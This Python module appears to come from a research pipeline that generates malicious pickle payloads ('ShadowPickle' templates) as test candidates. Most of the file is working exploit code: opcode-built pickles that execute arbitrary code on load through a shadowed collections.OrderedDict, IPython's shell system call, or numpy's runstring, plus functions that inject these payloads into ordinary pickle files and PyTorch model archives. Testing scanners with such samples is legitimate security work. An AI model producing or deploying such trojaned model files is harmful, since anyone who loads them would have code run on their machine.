"""ShadowPickle attack templates for candidate generation (Phase 2).

Provides parameterized templates for the three classes of ShadowPickle attacks:
- T2.1: Overwritten-Module Attack
- T2.2: PyPI-Injected Attack
- T2.3: External-Module Attack
"""

from __future__ import annotations

import pickle
import sys
import types
from typing import Any


class AttackTemplate:
    """Base class for all ShadowPickle attack templates.

    ``sink_kind`` selects how ``payload_code`` is delivered to the target
    callable at load time, so the payload always triggers the side effect:
      * ``"exec"``      -- the callable execs the code string directly.
      * ``"system"``    -- the callable runs a shell command; the code is
                           wrapped in ``python3 -c``.
      * ``"runstring"`` -- the callable execs the code in a local namespace
                           (takes ``(code, locals_dict)``).
    """

    sink_kind = "exec"

    def __init__(self, module_name: str, callable_name: str):
        self.module_name = module_name
        self.callable_name = callable_name

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Return the pickle bytes that trigger this attack with the given payload code."""
        raise NotImplementedError

    def _args_for(self, payload_code: str) -> tuple:
        """Wrap payload_code into the argument tuple expected by this sink."""
        if self.sink_kind == "system":
            return (f"python3 -c {payload_code!r}",)
        if self.sink_kind == "runstring":
            return (payload_code, {})
        return (payload_code,)


class OverwrittenModuleTemplate(AttackTemplate):
    """
    T2.1: Overwritten-Module Attack Template.

    This attack shadows a standard/builtin class (e.g. collections.OrderedDict)
    with a malicious implementation that runs exec() during instantiation.

    The trigger pickle is self-contained: stage 1 exec()s the shadow setup
    (installing a malicious ``collections`` module into ``sys.modules``) and
    stage 2 GLOBALs ``collections.OrderedDict`` -- now the shadowed class --
    with the payload string as its argument, so ``exec(payload_code)`` runs on
    instantiation. No shadow-module file needs to be deployed into the sandbox,
    so the same bytes work in the validity oracle and the DynaHug container.
    """

    def __init__(self, module_name: str = "collections", class_name: str = "OrderedDict"):
        super().__init__(module_name, class_name)
        self.class_name = class_name  # base stores it as callable_name

    def generate_module_code(self) -> str:
        """Return Python source that replaces ``sys.modules[module]`` with a shadow
        module whose ``class_name`` executes string arguments in ``__new__``.

        The real module is captured *first* (before the shadow is installed),
        so ``__new__`` can delegate to the genuine implementation after running
        the payload -- keeping the loaded object structurally valid.
        """
        return f'''# Auto-generated shadow module for {self.module_name}.{self.class_name}
import sys
import types
import collections as _real_collections

class _Shadow{self.class_name}(_real_collections.{self.class_name}):
    # _real is bound as a default argument at class-definition time so the
    # methods never need a runtime global lookup: exec() (and the C pickle
    # accelerator's dispatch) may resolve globals from an unrelated module
    # dict (e.g. torch.serialization), which must not break delegation.
    def __new__(cls, *args, _real=_real_collections.{self.class_name}, **kwargs):
        if args and isinstance(args[0], str):
            exec(args[0])
            return _real.__new__(cls)
        return super().__new__(cls)

    def __init__(self, *args, **kwargs):
        if not (args and isinstance(args[0], str)):
            super().__init__(*args, **kwargs)

_shadow = types.ModuleType({self.module_name!r})
_shadow.{self.class_name} = _Shadow{self.class_name}
_shadow.__dict__.update({{
    k: v for k, v in _real_collections.__dict__.items()
    if not k.startswith("__") and k != {self.class_name!r}
}})
sys.modules[{self.module_name!r}] = _shadow
'''

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Generate a two-stage pickle: install the shadow module, then trigger
        the (now shadowed) class with payload_code as its constructor argument."""
        from pipeline.opcodes import OPCODES_BY_NAME

        setup = self.generate_module_code()
        parts = []
        # Stage 1: exec(setup, {}) installs the shadow module in sys.modules.
        # The explicit globals dict forces module-scope execution (globals ==
        # locals); without it, exec called from a function frame (e.g. the C
        # pickle dispatch invoked by torch.load) binds the import names into
        # the function's locals, which a class body can never see.
        parts.append(OPCODES_BY_NAME["GLOBAL"].code + b"builtins\nexec\n")
        parts.append(pickle.dumps((setup, {}), protocol=2)[2:-1])  # strip PROTO/STOP
        parts.append(OPCODES_BY_NAME["REDUCE"].code)
        parts.append(OPCODES_BY_NAME["POP"].code)
        # Stage 2: instantiate the shadowed class; its __new__ execs the payload.
        parts.append(OPCODES_BY_NAME["GLOBAL"].code
                     + f"{self.module_name}\n{self.class_name}\n".encode("latin1"))
        parts.append(pickle.dumps((payload_code,), protocol=2)[2:-1])
        parts.append(OPCODES_BY_NAME["REDUCE"].code)
        # No trailing POP: these streams are loaded standalone (pickle.loads in
        # inject_payload_into_torch), so the stack must be non-empty at STOP --
        # leave the constructed object on the stack for loads to return.
        parts.append(OPCODES_BY_NAME["STOP"].code)
        return b"".join(parts)


class PyPIInjectedTemplate(AttackTemplate):
    """
    T2.2: PyPI-Injected Attack Template.

    Imports a callable from a third-party PyPI library that naturally executes
    code. Defaults to ``IPython.utils.process.system`` (IPython is installed in
    the base image), a shell-command sink.
    """

    sink_kind = "system"

    def __init__(self, module_name: str = "IPython.utils.process", callable_name: str = "system"):
        super().__init__(module_name, callable_name)

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Generate the pickle bytes calling the PyPI library callable with payload_code."""
        return _generate_payload(self.module_name, self.callable_name,
                                 self._args_for(payload_code))


class ExternalModuleTemplate(AttackTemplate):
    """
    T2.3: External-Module Attack Template.

    Imports a built-in/existing callable (like numpy.testing._private.utils.runstring)
    to execute code. Defaults to ``runstring``, which execs code in a namespace.
    """

    sink_kind = "runstring"

    def __init__(self, module_name: str = "numpy.testing._private.utils",
                 callable_name: str = "runstring"):
        super().__init__(module_name, callable_name)

    def generate_pickle_payload(self, payload_code: str) -> bytes:
        """Generate the pickle bytes calling the external module callable with payload_code."""
        return _generate_payload(self.module_name, self.callable_name,
                                 self._args_for(payload_code))


def _generate_payload(module_name: str, class_name: str, args: tuple) -> bytes:
    """Generate pickle bytes that call ``module_name.class_name`` with ``args``.

    Built directly from opcodes (``GLOBAL <module> <name> <args> REDUCE POP STOP``)
    so the module never has to be importable at dump time. Dotted modules such
    as ``numpy.testing._private.utils`` are only resolvable at load time inside
    the container image; the old placeholder-class approach made pickle.dumps
    itself raise ``PicklingError`` ("No module named 'numpy'").
    """
    from pipeline.opcodes import OPCODES_BY_NAME

    args_bytes = pickle.dumps(args, protocol=2)[2:-1]  # strip PROTO/STOP
    # No trailing POP: the stream is loaded standalone (pickle.loads inside
    # inject_payload_into_torch), so STOP must see a non-empty stack.
    return (
        OPCODES_BY_NAME["GLOBAL"].code
        + f"{module_name}\n{class_name}\n".encode("latin1")
        + args_bytes
        + OPCODES_BY_NAME["REDUCE"].code
        + OPCODES_BY_NAME["STOP"].code
    )


# Family id -> template instance. ``gadget`` is handled by the generator's
# dangerous-callable injection path, not by a template.
FAMILY_TEMPLATES: dict[str, AttackTemplate] = {
    "overwritten": OverwrittenModuleTemplate(),
    "pypi_injected": PyPIInjectedTemplate(),
    "external": ExternalModuleTemplate(),
}

FAMILIES: tuple[str, ...] = ("gadget",) + tuple(FAMILY_TEMPLATES)

# Stable per-family mutation_template label recorded in the campaign DB.
FAMILY_LABELS: dict[str, str] = {
    "gadget": "inject_payload_into_torch",
    "overwritten": "shadowpickle_overwritten",
    "pypi_injected": "shadowpickle_pypi_injected",
    "external": "shadowpickle_external",
}


def family_template(family: str) -> AttackTemplate | None:
    """Return the template for a ShadowPickle family id, or None for 'gadget'."""
    return FAMILY_TEMPLATES.get(family)


def _get_placeholder_class(module_name: str, class_name: str) -> type:
    """Helper to dynamically create/get a dummy class on a dummy module to satisfy pickle.dumps check."""
    if module_name not in sys.modules:
        mod = types.ModuleType(module_name)
        sys.modules[module_name] = mod
    else:
        mod = sys.modules[module_name]

    if not hasattr(mod, class_name):
        cls = type(class_name, (object,), {})
        cls.__module__ = module_name
        cls.__qualname__ = class_name
        setattr(mod, class_name, cls)
    else:
        cls = getattr(mod, class_name)

    return cls


class _InjectHelper:
    """A helper object that has a custom unpickler state to inject arbitrary pickle payloads."""

    def __init__(self, pickle_bytes: bytes):
        self.pickle_bytes = pickle_bytes

    def __reduce__(self):
        # When unpickling, load the embedded pickle payload directly.
        # This allows injecting raw pickle bytes into another object graph.
        return (pickle.loads, (self.pickle_bytes,))


def inject_payload_into_pickle(benign_pkl_path: str, malicious_pkl_path: str, payload_bytes: bytes) -> None:
    """Load a benign pickle file, insert the payload helper object, and save to malicious_pkl_path."""
    with open(benign_pkl_path, "rb") as f:
        data = pickle.load(f)

    helper = _InjectHelper(payload_bytes)
    if isinstance(data, dict):
        data["_shadowpickle_payload"] = helper
    elif isinstance(data, list):
        data.append(helper)
    else:
        data = [data, helper]

    with open(malicious_pkl_path, "wb") as f:
        pickle.dump(data, f)


def inject_payload_into_torch(benign_pt_path: str, malicious_pt_path: str, payload_bytes: bytes) -> None:
    """Load a benign PyTorch model safely, insert the payload helper object, and save to malicious_pt_path."""
    import zipfile
    import struct

    with zipfile.ZipFile(benign_pt_path, "r") as z_in:
        with zipfile.ZipFile(malicious_pt_path, "w", compression=zipfile.ZIP_DEFLATED) as z_out:
            for item in z_in.infolist():
                data = z_in.read(item.filename)
                if item.filename.endswith("data.pkl"):
                    # Find the STOP opcode at the end (b'.') and inject the loads call
                    if data.endswith(b"."):
                        injection = (
                            b"c_pickle\nloads\n"
                            b"("
                            b"B" + struct.pack("<I", len(payload_bytes)) + payload_bytes +
                            b"t"
                            b"R"
                            b"0"
                        )
                        rebuilt = data[:-1] + injection + b"."
                        # Fix FRAME sizes if protocol >= 4
                        if len(rebuilt) > 11 and rebuilt[0] == 0x80 and rebuilt[2] == 0x95:
                            body_len = len(rebuilt) - 11
                            rebuilt = rebuilt[:3] + struct.pack("<Q", body_len) + rebuilt[11:]
                        data = rebuilt
                z_out.writestr(item.filename, data)
